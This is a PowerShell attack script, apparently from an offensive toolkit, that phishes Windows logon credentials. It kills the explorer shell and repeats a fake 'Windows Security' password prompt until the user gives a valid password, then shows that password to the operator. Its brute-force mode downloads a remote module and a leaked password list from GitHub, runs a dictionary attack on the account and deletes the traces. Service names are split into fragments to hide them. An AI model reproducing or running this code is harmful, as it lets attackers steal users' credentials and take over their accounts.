<#
.SYNOPSIS
   Promp the current user for a valid credential.

   Author: @mubix|@r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.0.3

.DESCRIPTION
   This CmdLet interrupts EXPLORER process until a valid credential is entered
   correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
   process and leaks the credentials on this terminal shell (Social Engineering).

.NOTES
   Remark: CredsPhish.ps1 CmdLet its set for 5 fail validations before abort.
   Remark: CredsPhish.ps1 CmdLet requires lmhosts + lanmanserver services running.
   Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.

.Parameter PhishCreds
   Accepts arguments: Start and Brute

.Parameter Limmit
   Aborts phishing after -Limmit [fail attempts] reached.

.Parameter Dicionary
   Accepts the absoluct \ relative path of dicionary.txt
   Remark: Optional param of -PhishCreds [ Brute ] @arg

.EXAMPLE
   PS C:\> powershell -File CredsPhish.ps1
   Prompt the current user for a valid credential.

.EXAMPLE
   PS C:\> powershell -File CredsPhish.ps1 -Limmit 30
   Prompt the current user for a valid credential and
   Abort phishing after -Limmit [number] fail attempts.

.EXAMPLE
   PS C:\> powershell -File CredsPhish.ps1 -PhishCreds Brute
   Brute Force User account password using @redpill default dicionary

.EXAMPLE
   PS C:\> powershell -File CredsPhish.ps1 -PhishCreds Brute -Dicionary "$Env:TMP\passwords.txt"
   Brute force User account password using attackers -Dicionary [ path ] text file

.OUTPUTS
   Captured Credentials (LogOn)
   ----------------------------
   TimeStamp : 01/17/2021 15:26:24
   username  : r00t-3xp10it
   password  : mYs3cr3tP4ss
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Dicionary="$Env:TMP\passwords.txt",
   [string]$PhishCreds="Start",
   [int]$Limmit='5'
)


$PCName = $Env:COMPUTERNAME
$RawServerName = "Lanm" + "anSer" + "ver" -Join ''
$CheckCompatiblity = (Get-Service -Computer $PCName -Name $RawServerName).Status
If(-not($CheckCompatiblity -ieq "Running")){
    Write-Host "`n[*error*] $RawServerName required service not running!" -ForeGroundColor Red -BackGroundColor Black
    Write-Host "[execute] Set-Service -Name `"$RawServerName`" -Status running -StartupType automatic`n" -ForeGroundColor Yellow
    exit ## Exit @CredsPhish
}

$RawHostState = "lmh" + "os" + "ts" -Join ''
$CheckCompatiblity = (Get-Service -Computer $PCName -Name $RawHostState).Status
If(-not($CheckCompatiblity -ieq "Running")){
    Write-Host "`n[*error*] $RawHostState required service not running!" -ForeGroundColor Red -BackGroundColor Black
    Write-Host "[execute] Set-Service -Name `"$RawHostState`" -Status running -StartupType automatic`n" -ForeGroundColor Yellow
    exit ## Exit @CredsPhish
}


If($PhishCreds -ieq "Brute"){

    <#
    .SYNOPSIS
       Helper - Brute Force User Account Password (LogOn)
   
    .Parameter Dicionary
       Accepts the absoluct \ relative path of dicionary.txt       

    .EXAMPLE
       PS C:\> powershell -File CredsPhish.ps1 -PhishCreds Brute
       Brute Force User account password using @redpill default dicionary

    .EXAMPLE
       PS C:\> powershell -File CredsPhish.ps1 -PhishCreds Brute -Dicionary "$Env:TMP\passwords.txt"
       Brute Force User account password using attacker own dicionary text file

    .OUTPUTS
       Brute Force [ pedro ] account
       -----------------------------
       DEBUG: trying password [0]: toor
       DEBUG: trying password [1]: pedro
       DEBUG: trying password [2]: s3cr3t
       DEBUG: trying password [3]: qwerty
       DEBUG: login success @(pedro=>qwerty)

       Attempt StartTime EndTime  Account Password
       ------- --------- -------  ------- --------
       3       18:26:43  18:27:11 pedro   qwerty
    #>

    $user = [Environment]::UserName
    ## Make sure all dependencies are meet
    If(-not(Test-Path -Path "$Env:TMP\localbrute.ps1")){
        Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/localbrute.ps1 -Destination $Env:TMP\localbrute.ps1 -ErrorAction SilentlyContinue|Out-Null
    } 
    If(-not(Test-Path -Path "$Dicionary")){## Download dicionary text file from my github
        iwr -uri https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt -OutFile $Dicionary -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
    }
    
        ## Execute the auxiliary module
        Import-Module -Name "$Env:TMP\localbrute.ps1" -Force
        localbrute $user $Dicionary debug

    ## Clean ALL artifacts left behind
    Remove-Item -Path "$Dicionary" -Force -EA SilentlyContinue
    Remove-Item -Path "localbrute.state" -Force -EA SilentlyContinue
    Remove-Item -Path "$Env:TMP\localbrute.ps1" -Force -EA SilentlyContinue
    exit ## Exit @CredsPhish
}


$account = $null
$timestamp = $null
taskkill /f /im explorer.exe

[int]$counter = 0
While($counter -lt $Limmit){## 5 fail attempts until abort (default)

   <#
   .SYNOPSIS
      Helper - Promp the current user for a valid credential.

   .DESCRIPTION
      This CmdLet interrupts EXPLORER process until a valid credential is entered
      correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
      process and leaks the credentials on this terminal shell (Social Engineering).

   .EXAMPLE
      PS C:\> powershell -File CredsPhish.ps1
      Prompt the current user for a valid credential.

   .EXAMPLE
      PS C:\> powershell -File CredsPhish.ps1 -Limmit 30
      Prompt the current user for a valid credential and
      Abort phishing after -Limmit [number] fail attempts.

   .OUTPUTS
      Captured Credentials (LogOn)
      ----------------------------
      TimeStamp : 01/17/2021 15:26:24
      username  : r00t-3xp10it
      password  : mYs3cr3tP4ss
   #>

   $user    = [Environment]::UserName
   $domain  = [Environment]::UserDomainName

   Add-Type -assemblyname System.Windows.Forms
   Add-Type -assemblyname System.DirectoryServices.AccountManagement
   $DC = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)

   $account = [System.Security.Principal.WindowsIdentity]::GetCurrent().name
   $credential = $host.ui.PromptForCredential("Windows Security", "Please enter your UserName and Password.", $account, "NetBiosUserName")
   $validate = $DC.ValidateCredentials($account, $credential.GetNetworkCredential().password)

       $user = $credential.GetNetworkCredential().username;
       $pass = $credential.GetNetworkCredential().password;
       If(-not($validate) -or $validate -eq $null){## Fail to validate credential input againt DC

           $logpath = Test-Path -Path "$Env:TMP\CredsPhish.log";If($logpath -eq $True){Remove-Item $Env:TMP\CredsPhish.log -Force}
           $msgbox = [System.Windows.Forms.MessageBox]::Show("Invalid Credentials, Please try again ..", "$account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)

       }Else{## We got valid credentials

           $TimeStamp = Get-Date
           echo "" > $Env:TMP\CredsPhish.log
           echo "   Captured Credentials (logon)" >> $Env:TMP\CredsPhish.log
           echo "   ----------------------------" >> $Env:TMP\CredsPhish.log
           echo "   TimeStamp : $TimeStamp" >> $Env:TMP\CredsPhish.log
           echo "   username  : $user" >> $Env:TMP\CredsPhish.log
           echo "   password  : $pass" >> $Env:TMP\CredsPhish.log
           Get-Content $Env:TMP\CredsPhish.log
           Remove-Item -Path "$Env:TMP\CredsPhish.log" -Force
           Start-Process -FilePath $Env:WINDIR\explorer.exe
           exit ## Exit @CredsPhish

       }
       $counter++
}

## Clean ALL artifacts left behind
If($counter -eq $Limmit){## Internal Abort function

    ## Build Output Table
    echo "" > $Env:TMP\CredsPhish.log
    echo "   Captured Credentials (logon)" >> $Env:TMP\CredsPhish.log
    echo "   ----------------------------" >> $Env:TMP\CredsPhish.log
    echo "   Status    : Phishing Aborted!" >> $Env:TMP\CredsPhish.log
    echo "   Limmit    : $Limmit (fail validations)" >> $Env:TMP\CredsPhish.log
    Get-Content $Env:TMP\CredsPhish.log
    Remove-Item -Path "$Env:TMP\CredsPhish.log" -Force
    Start-Process -FilePath $Env:WINDIR\explorer.exe
    exit ## Exit @CredsPhish

}